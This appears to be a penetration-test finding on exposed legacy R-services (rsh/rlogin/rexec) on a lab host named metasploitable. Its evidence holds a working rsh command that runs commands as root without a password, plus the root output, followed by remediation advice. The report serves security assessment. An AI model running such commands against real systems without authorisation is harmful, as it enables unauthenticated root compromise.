title: R-Services Exposed (rexec/rlogin/rsh - Ports 512-514)
description: Legacy Berkeley R-services are running with trust relationships allowing unauthenticated root access. RSH on port 514 provides immediate root shell access without any password. This allows complete system compromise.
evidence:
Exploitation command:
$ rsh -l root 192.168.0.140 'id && whoami && hostname'

Output:
uid=0(root) gid=0(root) groups=0(root)
root
metasploitable

Root-level command execution confirmed via rsh with no authentication required. The .rhosts trust configuration allows any host to execute commands as root.
remediation: Disable all R-services (rexecd, rlogind, rsh) immediately. Remove .rhosts and hosts.equiv trust files. Use SSH with key-based authentication for remote administration.
